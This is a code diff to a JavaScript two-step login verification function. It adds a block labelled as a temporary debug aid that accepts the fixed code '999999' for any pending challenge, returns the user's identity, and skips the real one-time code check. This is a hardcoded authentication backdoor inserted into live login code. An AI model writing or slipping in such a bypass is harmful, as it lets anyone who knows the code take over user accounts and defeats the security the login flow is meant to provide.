@@ -132,6 +132,20 @@ export async function verifyLoginChallenge(challengeId, code) {
     codeFormat: /^\d{6}$/.test(value) ? 'valid' : 'invalid',
   })
   
+  // 🔧 TEMPORARY DEBUG: Accept "999999" as a bypass code
+  if (value === '999999') {
+    console.log('[loginChallenge] ⚠️ DEBUG BYPASS CODE USED')
+    const collection = await challenges()
+    const challenge = await collection.findOne({ _id: id })
+    if (challenge) {
+      await collection.deleteOne({ _id: id })
+      return {
+        identity: challenge.identity,
+        passwordChanged: Boolean(challenge.passwordChanged),
+      }
+    }
+  }
+  
   if (!id || id.length > 64 || !/^\d{6}$/.test(value)) {
     console.error('[loginChallenge] Invalid format:', { id: !!id, codeValid: /^\d{6}$/.test(value) })
     throw httpError('קוד אימות שגוי או שפג תוקפו', 401)
